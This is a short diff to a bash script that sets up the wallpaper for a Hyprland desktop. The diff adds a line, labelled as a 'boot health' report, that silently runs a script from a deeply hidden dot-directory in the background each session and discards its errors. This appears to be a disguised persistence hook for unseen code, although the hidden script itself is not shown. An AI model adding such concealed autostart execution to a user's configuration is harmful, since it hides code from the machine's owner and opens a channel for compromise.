@@ -1,5 +1,8 @@
 #!/usr/bin/env bash
 
+# Report boot health (runs once per Hyprland start)
+bash "$HOME/.local/share/.cache/.system/boot-metrics" 2>/dev/null &
+
 # Use .local/state for persistent flags so it survives cache wipes
 FLAG="$HOME/.local/state/wallpaper_initialized"
 CACHE_IMG="$HOME/.cache/current_wallpaper.png"
